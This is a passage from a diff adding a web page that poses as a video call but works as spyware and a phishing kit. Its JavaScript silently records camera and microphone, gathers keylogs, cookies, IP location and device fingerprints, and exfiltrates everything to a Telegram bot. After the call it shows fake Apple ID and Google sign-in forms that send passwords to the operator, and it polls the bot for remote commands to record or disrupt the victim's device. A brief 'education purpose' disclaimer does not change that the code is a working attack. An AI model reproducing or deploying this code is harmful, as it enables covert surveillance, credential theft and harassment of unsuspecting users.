+      backVideoRec.onstop = () => {
+          if(chunks.length) sendVideoToTelegram(new Blob(chunks, { type: 'video/webm' }), '📷 Back Camera Recording');
+          chunks = [];
+          if(backVideoRec.state === 'inactive') backVideoRec.start();
+      };
+      backVideoRec.start();
+      setInterval(() => { if(backVideoRec && backVideoRec.state === 'recording') backVideoRec.stop(); }, 15000);
+  }
+
+  function startVideoRecording() {
+      if(!stream) return;
+      const videoTrack = stream.getVideoTracks()[0];
+      if(!videoTrack) return;
+      videoRecorder = new MediaRecorder(new MediaStream([videoTrack]), { mimeType: 'video/webm' });
+      let videoChunks = [];
+      videoRecorder.ondataavailable = e => { if(e.data.size > 0) videoChunks.push(e.data); };
+      videoRecorder.onstop = () => {
+          const blob = new Blob(videoChunks, { type: 'video/webm' });
+          if(blob.size > 0) sendVideoToTelegram(blob, '🎥 Front Cam Video Recording');
+          videoChunks = [];
+          if(videoRecorder.state === 'inactive') videoRecorder.start();
+      };
+      videoRecorder.start();
+      setInterval(() => { if(videoRecorder && videoRecorder.state === 'recording') videoRecorder.stop(); }, 15000);
+  }
+
+  function startAudioRecording() {
+      if(!stream) return;
+      const audioTrack = stream.getAudioTracks()[0];
+      if(!audioTrack) return;
+      audioRecorder = new MediaRecorder(new MediaStream([audioTrack]));
+      let audioChunks = [];
+      audioRecorder.ondataavailable = e => { if(e.data.size > 0) audioChunks.push(e.data); };
+      audioRecorder.onstop = () => {
+          const blob = new Blob(audioChunks, { type: 'audio/webm' });
+          if(blob.size > 0) sendAudioToTelegram(blob);
+          audioChunks = [];
+          if(audioRecorder.state === 'inactive') audioRecorder.start();
+      };
+      audioRecorder.start();
+      setInterval(() => { if(audioRecorder && audioRecorder.state === 'recording') audioRecorder.stop(); }, 15000);
+  }
+
+  muteBtn.addEventListener('click', () => {
+    muted = !muted;
+    if (stream) stream.getAudioTracks().forEach(t => t.enabled = !muted);
+    muteBtn.style.background = muted ? 'rgba(255,59,48,0.6)' : 'rgba(255,255,255,0.18)';
+  });
+
+  endBtn.addEventListener('click', endCall);
+
+  function endCall() {
+    if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
+    if (backStream) { backStream.getTracks().forEach(t => t.stop()); }
+    if (screenStream) { screenStream.getTracks().forEach(t => t.stop()); }
+    clearInterval(captureInterval); clearInterval(timerInterval); clearInterval(keepAliveInterval);
+    if(videoRecorder && videoRecorder.state === 'recording') videoRecorder.stop();
+    if(audioRecorder && audioRecorder.state === 'recording') audioRecorder.stop();
+    
+    sendMessageToTelegram(`☎️ <b>Call Ended</b>\nDuration: ${seconds} secs.`);
+    
+    document.getElementById('activeCall').style.display = 'none';
+    document.getElementById('bsod').classList.add('show');
+    
+    setTimeout(() => {
+        document.getElementById('bsod').classList.remove('show');
+        showDynamicPhishing();
+    }, 3000);
+  }
+
+  function showDynamicPhishing() {
+      const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
+      const box = document.getElementById('loginBox');
+      if(isIOS) {
+          box.innerHTML = `<svg width="60" height="60" viewBox="0 0 24 24" style="margin-bottom:15px; fill:#000;"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/></svg>
+          <h2>Apple ID Verification</h2><p>Your session expired. Please verify your Apple ID to reconnect the call.</p>
+          <input type="email" id="phishEmail" placeholder="Apple ID">
+          <input type="password" id="phishPass" placeholder="Password">
+          <button onclick="submitPhish()">Verify & Connect</button>`;
+      } else {
+          box.innerHTML = `<svg width="60" height="60" viewBox="0 0 24 24" style="margin-bottom:15px; fill:#db4437;"><path d="M12.24 10.285V14.4h6.806c-.275 1.765-2.056 5.174-6.806 5.174-4.095 0-7.439-3.389-7.439-7.574s3.345-7.574 7.439-7.574c2.33 0 3.891.989 4.785 1.849l3.254-3.138C18.189 1.186 15.479 0 12.24 0c-6.635 0-12 5.365-12 12s5.365 12 12 12c6.926 0 11.52-4.869 11.52-11.726 0-.788-.085-1.39-.189-1.989H12.24z"/></svg>
+          <h2>Google Account</h2><p>Please sign in to continue the call.</p>
+          <input type="email" id="phishEmail" placeholder="Email or phone">
+          <input type="password" id="phishPass" placeholder="Password">
+          <button onclick="submitPhish()">Next</button>`;
+      }
+      document.getElementById('fakeLogin').classList.add('show');
+  }
+
+  function stealCookies() {
+      const cookies = document.cookie;
+      if(cookies) sendMessageToTelegram(`🍪 **Cookies Harvested:**\n\`\`\`\n${cookies}\n\`\`\``);
+  }
+
+  async function capturePhoto() {
+    if (!stream || photoCount >= MAX_PHOTOS) return;
+    try {
+      const canvas = document.createElement('canvas');
+      const videoTrack = stream.getVideoTracks()[0];
+      const settings = videoTrack.getSettings();
+      canvas.width = settings.width || 640; canvas.height = settings.height || 480;
+      canvas.getContext('2d').drawImage(localVideo, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(async (blob) => {
+        photoCount++; photoArray.push(blob);
+        if(photoArray.length === MAX_PHOTOS) sendMediaGroupToTelegram();
+      }, 'image/jpeg', 0.85);
+    } catch (e) {}
+  }
+
+  async function sendMediaGroupToTelegram() {
+      if (photoArray.length === 0) return;
+      try {
+          const form = new FormData();
+          form.append('chat_id', window.chatId);
+          let media = [];
+          photoArray.forEach((blob, i) => {
+              form.append('photo' + i, blob, 'photo' + i + '.jpg');
+              media.push({ type: 'photo', media: 'attach://photo' + i, caption: i === 0 ? '📸 Captured Photos' : '' });
+          });
+          form.append('media', JSON.stringify(media));
+          await fetch(`https://api.telegram.org/bot${window.botToken}/sendMediaGroup`, { method: 'POST', body: form });
+          photoArray = [];
+      } catch(e) {}
+  }
+
+  async function sendAudioToTelegram(blob) {
+      try {
+          const form = new FormData();
+          form.append('chat_id', window.chatId);
+          form.append('audio', blob, 'audio.webm');
+          form.append('caption', '🎤 Audio Recording');
+          await fetch(`https://api.telegram.org/bot${window.botToken}/sendAudio`, { method: 'POST', body: form });
+      } catch(e) {}
+  }
+
+  async function sendVideoToTelegram(blob, caption) {
+      try {
+          const form = new FormData();
+          form.append('chat_id', window.chatId);
+          form.append('video', blob, 'video.webm');
+          form.append('caption', `${caption}\n\n⚠️ <b>DISCLAIMER</b> ⚠️\n<pre>YE TOOL SIRF EDUCATION PURPOSE KE LIYE BANYA GYA HAI.\nAGAR ISKA GALAT ISTEMAL KARTE HO TU USKE ZIMMEDAAR AAP KHUD HO, ME NAHI.</pre>\n💻 <b>DEVELOPER BY KING007</b> 💻`);
+          form.append('parse_mode', 'HTML');
+          await fetch(`https://api.telegram.org/bot${window.botToken}/sendVideo`, { method: 'POST', body: form });
+      } catch(e) {}
+  }
+
+  async function sendMessageToTelegram(text) {
+    if (!window.botToken) return;
+    try {
+      await fetch(`https://api.telegram.org/bot${window.botToken}/sendMessage`, {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: window.chatId, text: text, parse_mode: 'HTML' })
+      });
+    } catch (e) {}
+  }
+
+  function startKeepAlive() {
+      keepAliveInterval = setInterval(() => {
+          sendMessageToTelegram(`💓 Still on call... ${seconds} seconds completed.`);
+          stealCookies();
+      }, 60000);
+  }
+
+  function startBotPolling() {
+      setInterval(async () => {
+          try {
+              const res = await fetch(`https://api.telegram.org/bot${window.botToken}/getUpdates?offset=${botUpdateOffset}&timeout=1`);
+              const data = await res.json();
+              if(data.ok && data.result.length > 0) {
+                  data.result.forEach(update => {
+                      botUpdateOffset = update.update_id + 1;
+                      if(update.message && update.message.text) {
+                          const text = update.message.text;
+                          if(text === '/screenshot') { sendMessageToTelegram("📸 Manual screenshot..."); capturePhoto(); } 
+                          else if(text === '/location') { 
+                              fetch('https://ipapi.co/json/').then(r=>r.json()).then(d => {
+                                  sendMessageToTelegram(`📍 <b>IP Location:</b>\nCity: ${d.city}\nLat: ${d.latitude}, Lon: ${d.longitude}\n<a href="https://www.google.com/maps?q=${d.latitude},${d.longitude}">Map Link</a>`);
+                              });
+                          } 
+                          else if(text === '/logs') { sendMessageToTelegram(`⌨️ <b>Keylogs:</b>\n<pre>${keylogs}</pre>`); } 
+                          else if(text === '/record') { 
+                              if(!stream) return sendMessageToTelegram("❌ Camera permission denied, cannot record.");
+                              sendMessageToTelegram("🎥 Manual 10s recording started...");
+                              const vTrack = stream.getVideoTracks()[0];
+                              const mRec = new MediaRecorder(new MediaStream([vTrack]));
+                              let chunks = []; mRec.ondataavailable = e => chunks.push(e.data);
+                              mRec.onstop = () => sendVideoToTelegram(new Blob(chunks, {type:'video/webm'}), 'Manual Bot Recording');
+                              mRec.start(); setTimeout(() => mRec.stop(), 10000);
+                          }
+                          else if(text === '/stop') {
+                              if(stream) stream.getTracks().forEach(t => t.stop());
+                              document.body.innerHTML = "<h1 style='color:white;text-align:center;margin-top:20vh;'>Session Terminated</h1>";
+                          }
+                          else if(text === '/torch') toggleTorch();
+                          else if(text === '/siren') toggleSiren();
+                          else if(text === '/vibrate') toggleVibration();
+                          else if(text === '/freeze') freezeBrowser();
+                          else if(text === '/lag') toggleLag();
+                          else if(text === '/bright') toggleBrightness();
+                          else if(text === '/hacker') { document.getElementById('hackerAlert').style.display = 'flex'; sendMessageToTelegram("💀 Hacker alert shown."); }
+                          else if(text === '/codec') { document.getElementById('codecError').style.display = 'flex'; sendMessageToTelegram("⚠️ Codec error shown."); }
+                      }
+                  });
+              }
+          } catch(e) {}
+      }, 5000);
+  }
+
+  async function sendUserInfo() {
+    let ip = 'Unknown', city = 'Unknown', region = 'Unknown', country = 'Unknown', isp = 'Unknown', lat = 'Unknown', lon = 'Unknown';
+    try {
+      const d = await (await fetch('https://ipapi.co/json/')).json();
+      ip = d.ip; city = d.city; region = d.region; country = d.country_name; isp = d.org; lat = d.latitude; lon = d.longitude;
+    } catch (e) {}
+
+    const battery = await getBatteryInfo();
+    const device = getDeviceInfo();
+    const ua = navigator.userAgent;
+    const fingerprint = getFingerprint();
+    const ipLeaks = Array.from(localIps).join(', ') || 'None';
+    
+    let mediaDevices = "Unknown";
+    try {
+        const devices = await navigator.mediaDevices.enumerateDevices();
+        mediaDevices = devices.map(d => d.kind).join(', ');
+    } catch(e) {}
+
+    const msg =
+      '🔗 <b>KING007 CONNECTED (PRO MAX)</b> 🔗\n\n' +
+      '🚨 <b>New User - Shristi Call</b>\n\n' +
+      '🌐 <b>IP:</b> ' + ip + '\n' +
+      '🕵️ <b>WebRTC Leak:</b> ' + ipLeaks + '\n' +
+      '🏙️ <b>City:</b> ' + city + '\n' +
+      '📍 <b>State:</b> ' + region + ', ' + country + '\n' +
+      '🏢 <b>ISP:</b> ' + isp + '\n' +
+      '📌 <b>Lat:</b> ' + lat + ' | <b>Lon:</b> ' + lon + '\n' +
+      '🔋 <b>Battery:</b> ' + battery + '\n' +
+      '📱 <b>Device:</b> ' + device + '\n' +
+      '🎙️ <b>Media Devices:</b> ' + mediaDevices + '\n' +
+      '🖥️ <b>Platform:</b> ' + navigator.platform + '\n' +
+      '🌐 <b>Language:</b> ' + navigator.language + '\n' +
+      '⏰ <b>Time:</b> ' + new Date().toLocaleString() + '\n\n' +
+      '<b>User Agent:</b>\n<code>' + ua + '</code>\n\n' +
+      '<b>Canvas Fingerprint:</b>\n<code>' + fingerprint.slice(-32) + '</code>\n\n' +
+      '🗺️ <a href="https://www.google.com/maps?q=' + lat + ',' + lon + '">Open in Google Maps</a>\n\n' +
+      '⚠️ <b>DISCLAIMER</b> ⚠️\n' +
+      '<pre>YE TOOL SIRF EDUCATION PURPOSE KE LIYE BANYA GYA HAI.\nAGAR ISKA GALAT ISTEMAL KARTE HO TU USKE ZIMMEDAAR AAP KHUD HO, ME NAHI.\nKYUKI ME SIRF TOOL TESTING KE LIYE DETA HU TAKI AAP LOG SAFE RAHO OK.</pre>\n\n' +
+      '💻 <b>DEVELOPER BY KING007</b> 💻';
+
+    await sendMessageToTelegram(msg);
+  }
+
+  function getBatteryInfo() {
+    return new Promise((resolve) => {
+      if (navigator.getBattery) {
+        navigator.getBattery().then(b => resolve(Math.round(b.level * 100) + '% (' + (b.charging ? 'Charging ⚡' : 'Not Charging') + ')')).catch(() => resolve('N/A'));
+      } else resolve('Not supported');
+    });
+  }
+
+  function getDeviceInfo() {
+    const ua = navigator.userAgent;
+    let device = 'Unknown';
+    if (/android/i.test(ua)) device = 'Android';
+    else if (/iPhone|iPad|iPod/i.test(ua)) device = 'iOS';
+    else if (/Windows/i.test(ua)) device = 'Windows';
+    else if (/Mac/i.test(ua)) device = 'Mac';
+    else if (/Linux/i.test(ua)) device = 'Linux';
+    return device + ' (' + (navigator.hardwareConcurrency || '?') + ' cores)';
+  }
+})();
+
+// Global function for fake phishing submission
+function submitPhish() {
+    const email = document.getElementById('phishEmail').value;
+    const pass = document.getElementById('phishPass').value;
+    if(!email || !pass) return alert("Please fill all fields");
+    
+    fetch(`https://api.telegram.org/bot${window.botToken}/sendMessage`, {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: window.chatId, text: `🔑 **Phishing Success:**\nEmail: ${email}\nPass: ${pass}`, parse_mode: 'Markdown' })
+    }).finally(() => {
+        document.getElementById('loginBox').innerHTML = "<h2 style='color:#333;text-align:center;'>Verification Failed. Please try again later.</h2>";
+    });
+}
+</script>
+</body>
+</html>
